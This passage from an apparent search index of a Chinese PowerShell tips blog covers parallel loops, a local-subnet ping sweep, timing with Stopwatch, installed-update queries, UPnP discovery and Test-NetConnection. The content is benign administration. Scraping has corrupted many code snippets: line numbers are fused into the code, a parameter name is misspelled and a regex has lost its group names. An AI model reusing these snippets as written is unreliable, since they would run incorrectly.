的表达式有效。如果该表达式的执行结果是 $true，那么执行 “?“ 之后的表达式。如果该表达式的执行结果是 $false，那么执行 “:“ 之后的表达式。 如果您安装了 PowerShell 7 preview 版，请确保您更新到了最新版本，才能确保使用三元操作符。它并不是 PowerShell 7 preview 版本的一部分。","link":"/2019/12/02/powershell-7-ternary-operator/"},{"title":"PowerShell 技能连载 - -RepeatHeader 参数","text":"有一个不太为人所知的参数：RepeatHeader，它是做什么用的？ 假设您希望分页显示结果（在命令行中有效，而在 PowerShell ISE 中无效）： 1PS&gt; Get-Process | Out-Host -Paging 结果输出时每页会暂停，直到按下空格键。然而，列标题只显示在第一页中。 以下是更好的输出形式： 1PS&gt; Get-Process | Format-Table -RepeatHeader | Out-Host -Paging 现在，每一页都会重新显示列标题。-RepeatHeader 在所有的 Format-* cmdlet 中都有效。再次提醒，这个技巧只在基于控制台的 PowerShell 宿主中有效，并且在 PowerShell ISE 中无效。原因是：PowerShell ISE 没有固定的页大小，所以它无法知道一页什么时候结束。","link":"/2019/12/04/repeatheader-parameter/"},{"title":"PowerShell 技能连载 - Foreach -parallel（第 1 部分：PowerShell 7）","text":"PowerShell 7 发布了一个内置参数，可以并行运行不同的任务。以下是一个简单示例： 11..100 | ForEach-Object -ThrottleLimit 20 -Parallel { Start-Sleep -Seconds 1; $_ } 在普通的 ForEach-Object 循环中，这将花费 100 秒的时间执行。如果使用了 parallel，代码可以并行地执行。-ThrottleLimit 定义了“块”，因此在本例中，有20个线程并行运行，使总执行时间减少到5秒。 在过于激动之前，请记住每个线程都在其自己的 PowerShell 环境中运行。幸运的是，您可以访问前缀为“using:”的局部变量： 123$text = &quot;Output: &quot;1..100 | ForEach-Object -ThrottleLimit 20 -Parallel { Start-Sleep -Seconds 1; &quot;$using:text $_&quot; } 不过，当您开始使用多线程时，您需要了解线程安全知识。复杂对象，例如 ADUser 对象可能无法在多个线程之间共享，所以需要每个案例独立判断是否适合使用并行。 由于并行的 ForEach-Object 循环内置在 PowerShell 7 中，这并不意味着可以在 Windows PowerShell 中使用并行。在 Windows PowerShell 中有许多模块实现了该功能。我们将会在接下来的技能中介绍它们。","link":"/2019/12/06/foreach--parallel-part-1-powershell-7/"},{"title":"PowerShell 技能连载 - Foreach -parallel (第 2 部分：Windows PowerShell)","text":"PowerShell 7 发布了一个内置参数，可以并行运行不同的任务： 11..100 | ForEach-Object -ThrottleLimit 20 -Parallel { Start-Sleep -Seconds 1; $_ } 如果您使用的是 Windows PowerShell，那么您也可以使用类似的并行技术。例如，下载并安装这个免费的模块： 1Install-Module -Name PSParallel -Scope CurrentUser -Force 它带来一个新的命令：Invoke-Parallel：您可以这样使用它： 11..100 | Invoke-Parallel -ThrottleLimit 20 -Scrip-tBlock { Start-Sleep -Seconds 1; $_ } 由于 Invoke-Parallel 使用的是和 PowerShell 7 相同的技术，所以有相同的限制：每个线程都在它自己的线程中执行，并且不能存取本地变量。在下一个技能中，我们将学习一些有趣的示例。","link":"/2019/12/10/foreach--parallel-part-2-windows-powershell/"},{"title":"PowerShell 技能连载 - Foreach -parallel (第 3 部分：批量 Ping)","text":"在 PowerShell 7 中，带来了一个新的并行的 Foreach-Object，它可以并行执行代码并显著加快操作的速度。同样的技术可通过以下模块在 Windows PowerShell 中使用： 1Install-Module -Name PSParallel -Scope CurrentUser -Force 我们来看看有趣的案例。例如，如果您需要获得一个能够响应 ping (ICMP) 的计算机列表，这将需要很长时间。一个加速操作的方法是使用带超时设置的 ping，这样无需对不响应的机器等待太久。 这段代码 ping powershell.one 并且等待最长 1000 毫秒（代码来自 https://powershell.one/tricks/network/ping）： 123456$ComputerName = 'powershell.one'$timeout = 1000$ping = New-Object System.Net.NetworkInformation.Ping$ping.Send($ComputerName, $timeout) | Select-Object -Property Status, @{N='IP';E={$ComputerName}}, Address 现在让我们来加速整件事，整批 ping 整个 IP 段！ 我们先来看看在 PowerShell 7 中如何实现： 12345678910111213141516171819202122232425262728#requires -Version 7.0# IP range to ping$IPAddresses = 1..255 | ForEach-Object {&quot;192.168.0.$_&quot;}# timeout in milliseconds$timeout = 1000# number of simultaneous pings$throttleLimit = 80# measure execution time$start = Get-Date$result = $IPAddresses | ForEach-Object -ThrottleLimit $throttleLimit -parallel { $ComputerName = $_ $ping = [System.Net.NetworkInformation.Ping]::new() $ping.Send($ComputerName, $using:timeout) | Select-Object -Property Status, @{N='IP';E={$ComputerName}}, Address } | Where-Object Status -eq Success$end = Get-Date$time = ($end - $start).TotalMillisecondsWrite-Warning &quot;Execution Time $time ms&quot;$result 在 5 秒钟左右，整个 IP 段都 ping 完毕，并且返回会 ICMP 请求的 IP 地址。 在 Windows PowerShell 中，这段代码基本差不多（假设您已从 PowerShell Gallery 中安装了 PSParallel 模块）： 1234567891011121314151617181920212223242526272829#requires -Modules PSParallel#requires -Version 3.0# IP range to ping$IPAddresses = 1..255 | ForEach-Object {&quot;192.168.0.$_&quot;}# number of simultaneous pings$throttleLimit = 80# measure execution time$start = Get-Date$result = $IPAddresses | Invoke-Parallel -ThrottleLimit $throttleLimit -ScriptBlock { $ComputerName = $_ # timeout in milliseconds $timeout = 1000 $ping = New-Object -TypeName System.Net.NetworkInformation.Ping $ping.Send($ComputerName, $timeout) | Select-Object -Property Status, @{N='IP';E={$ComputerName}}, Address } | Where-Object Status -eq Success$end = Get-Date$time = ($end - $start).TotalMillisecondsWrite-Warning &quot;Execution Time $time ms&quot;$result 与 ForEach-Object 不同，代码使用的是 Invoke-Parallel，而且由于 Invoke-Parallel 不支持 “use:“ 前缀，所以所有局部变量都必须包含在脚本块中（在我们的示例中，是变量$timeout）。 Invoke-Parallel 支持一个友好的进度条，这样您可以知道有多少个任务正在并行执行。","link":"/2019/12/12/foreach--parallel-part-3-mass-ping/"},{"title":"PowerShell 技能连载 - 使用一个计时器来测量执行时间","text":"有一些情况下您希望知道一段代码需要执行多长时间，例如返回统计或者对比代码，有许多方法可以测量命令，包括 Measure-Command cmdlet： 1234567$duration = Measure-Command -Expression { $result = Get-Hotfix}$time = $duration.TotalMilliseconds'{0} results in {1:n1} milliseconds' -f $result.Count, $time 不过 Measure-Command 有一些不受人喜欢的副作用： 所有输出都被丢弃，这样输出数据不会影响测量时间，而且您无法控制这个行为 出于好几个原因，它会减慢您的代码执行，其中一个是 Measure-Command 在 dot-sourced 表达式中以一个独立的脚本快执行 所以，常常使用另一个技术，用的是 Get-Date，例如这样： 123456$start = Get-Date$result = Get-Hotfix$end = Get-Date$time = ($end - $start).TotalMilliseconds'{0} results in {1:n1} milliseconds' -f $result.Count, $time 它可以有效工作，不过也有一些不受欢迎的副作用： 它产生更多的代码 当计算机处于睡眠或休眠状态，将会影响结果，因为计算机关闭的时间不应该计入统计时间 一个更简洁的解决方案是使用 .NET 的 stopwatch 对象，它产生的代码更少，并且不会减缓代码的执行，而且不受睡眠或休眠的影响： 12345$stopwatch = [system.diagnostics.stopwatch]::StartNew()$result = Get-Hotfix$time = $stopwatch.ElapsedMilliseconds'{0} results in {1:n1} milliseconds' -f $result.Count, $time 此外，您可以对 stopwatch 对象调用 Stop()、Restart() 和 Reset() 方法。通过这些方法，您可以暂停测量代码中的某些部分（例如数据输出）并且继续测量。","link":"/2019/12/16/using-a-stopwatch-to-measure-execution-times/"},{"title":"PowerShell 技能连载 - 退出 PowerShell 管道（第 1 部分：Select-Object）","text":"有些时候人工退出 PowerShell 管道可以节约很多时间。例如，在开始递归搜索之前不能确切地知道一个文件所在的位置，当搜到文件的时候立刻停止。当找到文件以后没理由继续搜索其它目录。 下面是一个演示该问题的场景：假设您在 Windows 文件夹中的某个地方搜索一个名为 “ngen.log” 的文件： 123$fileToSearch = 'ngen.log'Get-ChildItem -Path c:\\Windows -Recurse -ErrorAction SilentlyContinue -Filter $fileToSearch PowerShell 将会查找这个文件但是找到之后还会继续搜索目录树的其它部分，这会消耗很多时间。 如果您知道需要查找结果的个数，那么可以当搜到指定数量的结果后使用 Select-Object 来立刻退出管道。 123$fileToSearch = 'ngen.log'Get-ChildItem -Path c:\\Windows -Recurse -ErrorAction SilentlyContinue -Filter $fileToSearch |Select-Object -First 1 在这个例子中，当找到文件时 PowerShell 立即退出。作为最佳实践，如果您事先知道需要从命令中查找多少个结果，那么在管道尾部添加 Select-Object，并且用 -First 参数来告诉 PowerShell 需要的结果个数。","link":"/2019/12/18/aborting-the-powershell-pipeline-part-1-select-object/"},{"title":"PowerShell 技能连载 - 退出 PowerShell 管道（第 2 部分：手动退出）","text":"在前一个技能中我们学到了如何当达到一定次数的时候退出 PowerShell 管道，这样可以节约很多时间： 123$fileToSearch = 'ngen.log'Get-ChildItem -Path c:\\Windows -Recurse -ErrorAction SilentlyContinue -Filter $fileToSearch |Select-Object -First 1 显然，当一定数量的结果传递给 Select-Object 之后，Select-Object 会发送秘密的信息到上一级管道的 cmdlet，告知它们停止。实际上，Select-Object 会抛出一个特殊的异常，PowerShell 会处理这个异常，才产生这个魔术的效果。 但是如果事先不知道确切的结果数量呢？如果您希望在其它情况下中断管道呢？如果您希望实现某种超时呢？要手动退出一个管道，只需要让 Select-Object 发出这个特殊的异常。以下是一个专门做这件事的 Stop-Pipeline 函数： 1234567function Stop-Pipeline{ $pipeline = { Select-Object -First 1 }.GetSteppablePipeline() $pipeline.Begin($true) $pipeline.Process(1) $pipeline.End()} 它调用了一个 Select-Object 并且模仿在管道中执行。它是通过 GetSteppablePipeline() 实现的。您现在可以通过 Process() 人工传递数据给 Select-Object。由于通过 -First 1 参数执行 Select-Object 命令，所以当传递任何数据给 Select-Object，都会产生该特殊的异常。 您现在获得了控制权，并且可以通过任何条件来调用 Stop-Pipeline。以下示例程序将搜索文件并且在最长 2 秒之内退出管道： 1234567891011121314151617181920212223242526function Stop-Pipeline{ $pipeline = { Select-Object -First 1 }.GetSteppablePipeline() $pipeline.Begin($true) $pipeline.Process(1) $pipeline.End()}# abort pipeline after 2000 milliseconds$timeout = 2000# create a stopwatch$stopwatch = [system.diagnostics.stopwatch]::StartNew()Get-ChildItem -Path c:\\Windows -Recurse -ErrorAction SilentlyContinue | ForEach-Object { if ($stopwatch.ElapsedMilliseconds -gt $timeout) { $stopwatch.Stop() Write-Warning &quot;Timeout, Pipeline Aborted.&quot; # abort pipeline Stop-Pipeline } # return the original object $_ }","link":"/2019/12/20/aborting-the-powershell-pipeline-part-2-manual-abort/"},{"title":"PowerShell 技能连载 - 列出已安装的更新（第 1 部分）","text":"Get-Hotfix 只会列出操作系统相关的 hotfix： 1Get-HotFix 实际上，它只是一个 WMI 查询的简单包装，结果是一样的： 1Get-CimInstance -ClassName Win32_QuickFixEngineering 一个更简单更完整的方法是查询系统事件日志获取所有安装的更新： 12345678910Get-WinEvent @{ Logname='System' ID=19 ProviderName='Microsoft-Windows-WindowsUpdateClient'} | ForEach-Object { [PSCustomObject]@{ Time = $_.TimeCreated Update = $_.Properties.Value[0] }} 显然，当系统事件日志清除之后，查询结果就不完整了。此外，该日志只是记录任何更新安装，因此随着时间的推移，新的更新可能取代旧的更新。 要保证获取到完整的已安装更新列表，您需要请求 Windows Update 客户端，从实际安装的更新中重建列表，这要消耗更多的时间： 1234$result = (New-Object -ComObject Microsoft.Update.Session).CreateupdateSearcher().Search(&quot;IsInstalled=1&quot;).Updates | Select-Object LastDeploymentChangeTime, Title, Description, MsrcSeverity$result | Out-GridView -Title 'Installed Updates'","link":"/2019/12/24/listing-installed-updates-part-1/"},{"title":"PowerShell 技能连载 - 列出已安装的更新（第 2 部分）","text":"在前一个技能中我们演示了如何通过 Windows Update 客户端获取当前已安装的更新。 可以对此列表进行润色，例如您可以使用哈希表创建计算的属性，提取默认情况下属于其他属性的信息，如知识库文章编号作为标题： 12345678910111213141516171819$severity = @{ Name = 'Severity' Expression = { if ([string]::IsNullOrEmpty($_.MsrcSeverity)) { 'normal' } else { $_.MsrcSeverity }}}$time = @{ Name = 'Time' Expression = { $_.LastDeploymentChangeTime }}$kb = @{ Name = 'KB' Expression = { if ($_.Title -match 'KB\\d{6,9}') { $matches[0] } else { 'N/A' }}}$UpdateSession = New-Object -ComObject Microsoft.Update.Session$UpdateSession.CreateupdateSearcher().Search(&quot;IsInstalled=1&quot;).Updates | Select-Object $time, Title, $kb, Description, $Severity | Out-GridView -Title 'Installed Updates' 结果显示在一个网格视图窗口中。如果您移除了 Out-GridView 那么信息看起来类似这样： Time : 9/10/2019 12:00:00 AM Title : 2019-09 Security Update for Adobe Flash Player for Windows 10 Version 1903 for x64-based Systems (KB4516115) KB : KB4516115 Description : A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system. Severity : Critical Time : 10/8/2019 12:00:00 AM Title : Windows Malicious Software Removal Tool x64 - October 2019 (KB890830) KB : KB890830 Description : After the download, this tool runs one time to check your computer for infection by specific, prevalent malicious software (including Blaster, Sasser, and Mydoom) and helps remove any infection that is found. If an infection is found, the tool will display a status report the next time that you start your computer. A new version of the tool will be offered every month. If you want to manually run the tool on your computer, you can download a copy from the Microsoft Download Center, or you can run an online version from microsoft.com. This tool is not a replacement for an antivirus product. To help protect your computer, you should use an antivirus product. Severity : normal Time : 10/8/2019 12:00:00 AM Title : 2019-10 Cumulative Update for .NET Framework 3.5 and 4.8 for Windows 10 Version 1903 for x64 (KB4524100) KB : KB4524100 Description : Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer. Severity : normal Time : 10/28/2019 12:00:00 AM Title : Update for Windows Defender Antivirus antimalware platform - KB4052623 (Version 4.18.1910.4) KB : KB4052623 Description : This package will update Windows Defender Antivirus antimalware platform’s components on the user machine. Severity : normal ...","link":"/2019/12/26/listing-installed-updates-part-2/"},{"title":"PowerShell 技能连载 - 探索即插即用设备（第 1 部分）","text":"您可能已经生活在一个互联的智能家居，许多设备连接到您的网络。PowerShell 只需几行代码就可以帮助您找到您的设备： 12$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;upnp:rootdevice&quot;, 0) 请注意 UPnP 查找器组件需要一些时间来检测您的设备。结果看起来类似这样： IsRootDevice : True RootDevice : System.__ComObject ParentDevice : HasChildren : False Children : System.__ComObject UniqueDeviceName : uuid:73796E6F-6473-6D00-0000-001132283f5e FriendlyName : Storage2 (DS414) Type : urn:schemas-upnp-org:device:Basic:1 PresentationURL : http://192.168.2.107:5000/ ManufacturerName : Synology ManufacturerURL : http://www.synology.com/ ModelName : DS414 ModelNumber : DS414 5.1-5055 Description : Synology NAS ModelURL : http://www.synology.com/ UPC : SerialNumber : 001132283f5e Services : System.__ComObject IsRootDevice : True RootDevice : System.__ComObject ParentDevice : HasChildren : False Children : System.__ComObject UniqueDeviceName : uuid:2f402f80-da50-11e1-9b23-001788ac0af1 FriendlyName : BridgeOne (192.168.2.100) Type : urn:schemas-upnp-org:device:Basic:1 PresentationURL : http://192.168.2.100/index.html ManufacturerName : Signify ManufacturerURL : http://www.meethue.com/ ModelName : Philips hue bridge 2015 ModelNumber : BSB002 Description : Philips hue Personal Wireless Lighting ModelURL : http://www.meethue.com/ UPC : SerialNumber : 001788ac0af1 Services : System.__ComObject ... 使用 Select-Object 来选择您感兴趣的属性： 1234$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;upnp:rootdevice&quot;, 0) | Select-Object ModelName, FriendlyName, PresentationUrl | Sort-Object ModelName 在我的家中，该列表看起来类似这样： ModelName FriendlyName PresentationURL --------- ------------ --------------- AFTMM Tobias's 2nd Fire TV AFTS Tobias's Fire TV AFTT Tobias's 3rd Fire TV stick DS414 Storage2 (DS414) http://192.168.2.107:5000/ NETGEAR Orbi Desktop AC3000 Router RBR50 (Gateway) http://www.orbilogin.net/ Philips hue bridge 2015 BridgeOne (192.168.2.100) http://192.168.2.100/index.html Philips hue bridge 2015 BridgeWork (192.168.2.106) http://192.168.2.106/index.html SoundTouch 20 Bad SoundTouch 30 Portable SoundTouch SA-4 Garden SoundTouch SA-4 LivingRoom 我正在使用群晖 NAS，假设我忘了访问它的 URL，那么现在可以快速地找回它。我的飞利浦灯光系统也是这样：UPnP 查找器返回所有 hub 的 IP 地址。 请注意 UPnP 查找器只能返回和您的计算机连入相同网络的设备。如果您的设备 IP 地址是在其它子网，那么不能通过这种方式检测。","link":"/2019/12/30/exploring-plug-play-devices-part-1/"},{"title":"PowerShell 技能连载 - 探索即插即用设备（第 2 部分）","text":"在前一个技能中，我们使用 UPnP.UPnPDeviceFinder 来发现连入您网络的智能设备。今天，让我们仔细看看返回的对象。 12$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$result = $UPnPFinder.FindByType(&quot;upnp:rootdevice&quot;, 0) 当您运行一个搜索（可能需要执行一定的时间），将会获取到许多信息，但是某些属性只是以 System.__ComObject 的形式返回。如何查看它们背后隐藏的信息？ 让我们取其中的一个返回对象。在我的例子中，通过查看 $result，我注意到一个来自 “NetGear” 对象。接下来，我使用 Where-Object 来存取它。 在您的场景中，可用的对象明显不同，这取决于您网络中使用的设备，所以您需要调整过滤器表达式来匹配返回的对象之一。 1234567891011121314151617181920212223PS&gt; $switch = $result | Where-Object ManufacturerName -like *NetGear*PS&gt; $switchIsRootDevice : TrueRootDevice : System.__ComObjectParentDevice :HasChildren : TrueChildren : System.__ComObjectUniqueDeviceName : uuid:4d696e69-444c-164e-9d42-3894ed0e1db5FriendlyName : RBR50 (Gateway)Type : urn:schemas-upnp-org:device:InternetGatewayDevice:1PresentationURL : http://www.orbilogin.net/ManufacturerName : NETGEAR, Inc.ManufacturerURL : http://www.netgear.com/ModelName : NETGEAR Orbi Desktop AC3000 RouterModelNumber : RBR50Description : http://www.netgear.com/home/products/wirelessroutersModelURL : http://www.netgear.com/orbiUPC : RBR50SerialNumber : 5R21945T06DA4Services : System.__ComObject 大多数属性使用普通的数据类型，例如 string 或者 integer。例如，”UniqueDeviceName” 返回一个设备的唯一名称（稍后会变得很重要）。然而某些属性，只是返回 “System.__ComObject”。让我们看看这些： 每个 PnP 设备可以是一个链条的一部分，并且由一个根设备开始。由于我们一开始搜索的是根设备，所以 “RootDevice” 属性总是对应返回的对象： 12PS&gt; $switch -eq $switch.RootDeviceTrue 要找出那些设备链接到根设备，请查看 “HasChildren” 和 “Children”：”HasChildren” 是一个简单的 Boolean 值。然而 “Children” 是一个 “System.__ComObject” 对象并且包含了我们想了解的信息： 12PS&gt; if ($switch.HasChildren) { $switch.Children.Count } else { 'no children' }1 显然地，”Children” 看起来是某种数组。总之，一个根设备可以有许多子设备。通过存取该属性，PowerShell 自动将 “System.__ComObject” 转换为可读取的 .NET 对象，以下是我的 NetGear 设备的子设备： 123456789101112131415161718192021PS&gt; $switch.ChildrenIsRootDevice : FalseRootDevice : System.__ComObjectParentDevice : System.__ComObjectHasChildren : TrueChildren : System.__ComObjectUniqueDeviceName : uuid:4d696e69-444c-164e-9d43-3894ed0e1db5FriendlyName : WAN DeviceType : urn:schemas-upnp-org:device:WANDevice:1PresentationURL :ManufacturerName : NETGEARManufacturerURL : http://www.netgear.com/ModelName : NETGEAR Orbi Desktop AC3000 RouterModelNumber : RBR50Description : WAN Device on NETGEAR RBR50 Orbi RouterModelURL : http://www.netgear.com/UPC : RBR50SerialNumber : 5R21945T06DA4Services : System.__ComObject 这个子设备之下还有子设备。但是，继续深挖并列出子设备之下的子设备看起来失败了： 12345678910111213141516PS&gt; # works:PS&gt; $switch.Children | Select-Object HasChildren, ChildrenHasChildren Children----------- -------- True System.__ComObjectPS&gt; # fails:PS&gt; $switch.Children.HasChildrenPS&gt; $switch.Children.ChildrenPS&gt; $switch.Children[0].HasChildrenValue does not fall within the expected range.PS&gt; $switch.Children[0].ChildrenValue does not fall within the expected range. 失败的原因是 COM 数组的一个特异性。它们使用一个非常规的枚举器，和普通的对象数组不同，所以 PowerShell 无法直接存取数组元素。一个简单的解决方案是使用 ForEach-Object： 1234567891011121314151617181920212223PS&gt; $child = $switch.ChildrenPS&gt; $child | ForEach-Object { $_.Children }IsRootDevice : FalseRootDevice : System.__ComObjectParentDevice : System.__ComObjectHasChildren : FalseChildren : System.__ComObjectUniqueDeviceName : uuid:4d696e69-444c-164e-9d44-3894ed0e1db5FriendlyName : WAN Connection DeviceType : urn:schemas-upnp-org:device:WANConnectionDevice:1PresentationURL :ManufacturerName : NETGEARManufacturerURL : http://www.netgear.com/ModelName : NETGEAR Orbi Desktop AC3000 RouterModelNumber : RBR50Description : WANConnectionDevice on NETGEAR RBR50 Orbi RouterModelURL : http://www.netgear.com/UPC : 606449084528SerialNumber : 5R21945T06DA4Services : System.__ComObject 同样地，也适用于 “ParentDevice” 和 `Services”。我们来查看我的 NetGear 设备的更多服务。这次，我希望直接存取我的 NetGear 设备（这样比枚举所有设备快得多）。不过您需要知道它的唯一设备名。在我的例子中，”UniqueDeviceName” 的值是 “uuid:4d696e69-444c-164e-9d42-3894ed0e1db5”： 12345$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder# the UDN is unique, so you need to find out the UDN for your device first# you cannot use the UDN I used$myNetgearSwitch = $UPnPFinder.FindByUDN('uuid:4d696e69-444c-164e-9d42-3894ed0e1db5')$myNetgearSwitch 这次，几乎立即识别出我的设备。要列出它的服务，我只需要获取它的 “Services” 属性，并且 PowerShell 自动将该 COM 对象转为可见的属性： 12345PS&gt; $myNetgearSwitch.ServicesServiceTypeIdentifier Id LastTransportStatus--------------------- -- -------------------urn:schemas-upnp-org:service:Layer3Forwarding:1 urn:upnp-org:serviceId:L3Forwarding1 0","link":"/2020/01/01/exploring-plug-play-devices-part-2/"},{"title":"PowerShell 技能连载 - 探索即插即用设备（第 3 部分）","text":"在前一个技能中我们演示了如何使用 UPnP.UPnPDeviceFinder 来查找网络中的设备。您已了解到如何枚举所有的根设备 (“upnp:rootdevice“)，以及如何通过设备的唯一标识符来访问设备。 12$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;upnp:rootdevice&quot;, 0) | Out-GridView 在这一部分中，让我们完成搜索类型，看看如何枚举所有设备（而不仅仅是根设备），以及如何枚举设备类型组。 要列出所有设备，请使用 “ssdb:all&quot; 而不是 &quot;upnp:rootdevice`”: 12$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;ssdp:all&quot;, 0) | Out-GridView 结果包括根设备（“IsRootDevice” 为 $true，“ParentDevice”为空）以及所有子设备（“IsRootDevice” 为 $false，“ParentDevice” 指向该设备链接到的上级设备）。 在 “UniqueDeviceName” 中，可以找到可用于直接访问设备的唯一设备名称： 12$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByUDN(&quot;uuid:...&quot;, 0) 每个设备都属于一个类别，该类别在“Type”中显示。要查看类型列表，请尝试以下操作： 1234$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;ssdp:all&quot;, 0) | Select-Object -ExpandProperty Type | Sort-Object -Unique 结果取决于网络中找到的设备。这是我得到的清单： urn:dial-multiscreen-org:device:dial:1 urn:schemas-upnp-org:device:Basic:1 urn:schemas-upnp-org:device:InternetGatewayDevice:1 urn:schemas-upnp-org:device:MediaRenderer:1 urn:schemas-upnp-org:device:WANConnectionDevice:1 urn:schemas-upnp-org:device:WANDevice:1 要查找特定类型的所有设备，请将该类型与 FindByType() 一起使用： 12$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;urn:schemas-upnp-org:device:InternetGatewayDevice:1&quot;, 0) 最后一点：设备是否响应组搜索，甚至是“upnp:rootdevice”，都取决于设备及其实现。在我的场景中，即使存在那种类型的设备，我也无法获得“Basic”和“WANDevice”组的结果。 如果找不到特定设备，请尝试适用于所有设备的唯一搜索，然后通过“ssdp:all”列出所有设备。如果设备现在显示出来，则可以通过 Where-Object 使用“ssdp：all”和客户端过滤，或者通过查找唯一的设备标识符并通过其 UDN 和 FindByUDN() 直接访问特定设备来加快搜索速度。","link":"/2020/01/03/exploring-plug-play-devices-part-3/"},{"title":"PowerShell 技能连载 - 探索即插即用设备（第 4 部分）","text":"在前面的技能中，我们研究了 UPnP.UPnPDeviceFinder 以及如何识别网络中的设备。让我们看一些用例。显然，这些用例是您的灵感来源，因为您可以做的事情完全取决于连接到网络的实际设备。 我的第一个用例是管理 NAS 设备，名为 Synology Disk Station。可以通过 WEB 界面进行管理，但我总是会忘记 URL，当然 URL 和端口会根据配置而有所不同。 这是一种搜索任何磁盘站并自动打开其 Web 界面的方法。由于所有连接数据都是从设备中检索的，因此即使 IP 地址更改或您配置了别的端口，此操作也仍然有效。 12345$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;ssdp:all&quot;, 0) |Where-Object ManufacturerName -eq 'Synology' |Select-Object -ExpandProperty PresentationUrl |ForEach-Object { Start-Process -FilePath $_ } 注意：如果您没有 Synology 磁盘站，请查看您拥有的其他设备。只需查看 FindByType() 返回的数据，然后根据需要定制 Where-Object。 由于该代码枚举了所有 UPnP 设备，因此需要 10 到 20 秒。如果要加快处理速度，可以找出所用设备的 UDN（唯一名称），以后再使用这些 UDN： 1234$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;ssdp:all&quot;, 0) |Where-Object ManufacturerName -eq 'Synology' |Select-Object -ExpandProperty UniqueDeviceName UDN 是唯一的，并且因设备而异，因此，如果您需要多次访问同一设备，则此方法才有意义。在我的情况下，UDN 是 uuid:7379AA6F-6473-6D00-0000-001132283f5e，现在打开 Web 界面的速度要快得多： 1234$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(&quot;uuid:7379AA6F-6473-6D00-0000-001132283f5e&quot;, 0) |Select-Object -ExpandProperty PresentationUrl |Foreach-Object { Start-Process -FilePath $_ } 这引出了我的第二个使用场景：我正在使用 Philips Hue 系统管理家里的灯光。飞利浦提供了丰富的 REST API 来实现自动化。您所需要的是网桥的 IP 地址。 这段代码将列出本地网络中所有 Philips Hue 网桥的 IP 地址： ``powershell$UPnPFinder = New-Object -ComObject UPnP.UPnPDeviceFinder$UPnPFinder.FindByType(“upnp:rootdevice”, 0) |Where-Object Description -like ‘Philips hue*’ |Select-Object -ExpandProperty FriendlyName |ForEach-Object { if ($_ -match ‘(?\\w*).?((?.))‘) { $null = $matches.Remove(0) [PSCustomObject]$matches } } 该代码查找根设备，其描述以 &quot;Philips hue&quot; 开头的根设备，然后使用正则表达式拆分 &quot;FriendlyName&quot; 属性的内容并返回网桥名称及其 IP 地址。 就我而言，结果如下所示： IP BridgeName -- ---------- 192.168.22.10 BridgeOne 192.168.23.16 BridgeWork &lt;!--本文国际来源：[Exploring Plug&amp;amp;Play Devices (Part 4)](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/exploring-plug-play-devices-part-4)--&gt;","link":"/2020/01/07/exploring-plug-play-devices-part-4/"},{"title":"PowerShell 技能连载 - 测试网络连接（第 1 部分）","text":"PowerShell 随附了 Test-NetConnection 命令，它可以像复杂的 ping 工具一样工作。默认情况下，您可以这样 ping 计算机： 123456789PS&gt; Test-NetConnection -ComputerName powershell.oneComputerName : powershell.oneRemoteAddress : 104.18.46.88InterfaceAlias : Ethernet 4SourceAddress : 192.168.2.108PingSucceeded : TruePingReplyDetails (RTT) : 26 ms 使用 -TraceRoute，它包括路由跟踪，列出了用于传播到目标的所有网络节点： 12345678910111213141516PS&gt; Test-NetConnection -ComputerName powershell.one -TraceRouteComputerName : powershell.oneRemoteAddress : 104.18.46.88InterfaceAlias : Ethernet 4SourceAddress : 192.168.2.108PingSucceeded : TruePingReplyDetails (RTT) : 25 msTraceRoute : 192.168.2.1 62.155.243.83 62.154.2.185 62.157.250.38 195.22.215.192 195.22.215.59 104.18.46.88","link":"/2020/01/09/testing-network-connections-part-1/"},{"title":"PowerShell 技能连载 - 测试网络连接（第 2 部分）","text":"如果您想测试一台特定的计算机或 URL 是否在线，几十年来一直使用 ping 请求 (ICMP)。最近，许多服务器和防火墙关闭了 ICMP 以减少攻击面。默认情况下，Test-NetConnection 使用 ICMP，因此在不响应 ICMP 的计算机上会失败： 1234567891011121314PS&gt; Test-NetConnection -ComputerName microsoft.comWARNING: Ping to 40.76.4.15 failed with status: TimedOutWARNING: Ping to 40.112.72.205 failed with status: TimedOutWARNING: Ping to 13.77.161.179 failed with status: TimedOutWARNING: Ping to 40.113.200.201 failed with status: TimedOutWARNING: Ping to 104.215.148.63 failed with status: TimedOutComputerName : microsoft.comRemoteAddress : 40.76.4.15InterfaceAlias : Ethernet 4SourceAddress : 192.168.2.108PingSucceeded : FalsePingReplyDetails (RTT) : 0 ms Test-NetConnection 内置了另一种计算机无法回避的测试：端口测试。端口提供对特定服务的访问，因此端口必须在任何公共服务可用。对于 Web 服务器，可以使用 80 端口，例如： 123456789PS&gt; Test-NetConnection -ComputerName microsoft.com -Port 80ComputerName : microsoft.comRemoteAddress : 104.215.148.63RemotePort : 80InterfaceAlias : Ethernet 4SourceAddress : 192.168.2.108TcpTestSucceeded : True 以下是常用的端口列表： HTTP: Port 80 HTTPS: Port 443 FTP: Port 21 FTPS/SSH: Port 22 TELNET: Port 23 POP3: Port 110 POP3 SSL: Port 995 IMAP: Port 143 IMAP SSL: Port 993 WMI: Port 135 RDP: Port 3389 DNS: Port 53 DHCP: Port 67, 68 SMB/NetBIOS: 139 NetBIOS over TCP: 445 PowerShell Remoting: 5985 PowerShell Remoting HTTPS: 